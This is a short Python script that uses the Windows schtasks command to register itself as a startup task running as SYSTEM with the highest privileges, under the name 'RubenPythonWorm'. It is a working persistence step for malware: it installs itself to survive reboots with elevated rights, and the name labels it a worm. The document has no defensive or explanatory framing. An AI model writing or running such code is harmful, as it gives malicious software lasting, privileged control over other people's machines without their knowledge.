import os
import subprocess
import sys

def create_startup_task(task_name, script_path):
    command = [
        "schtasks",
        "/create",
        "/sc", "onstart",
        "/tn", task_name,
        "/tr", f'"{sys.executable}" "{script_path}"', 
        "/ru", "SYSTEM",
        "/rl", "highest"
    ]
    
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Scheduled task '{task_name}' created successfully.")
        else:
            print(f"Failed to create task. Error: {result.stderr}")
    except Exception as e:
        print(f"An error occurred: {e}")

create_startup_task("RubenPythonWorm", os.path.abspath(sys.argv[0]))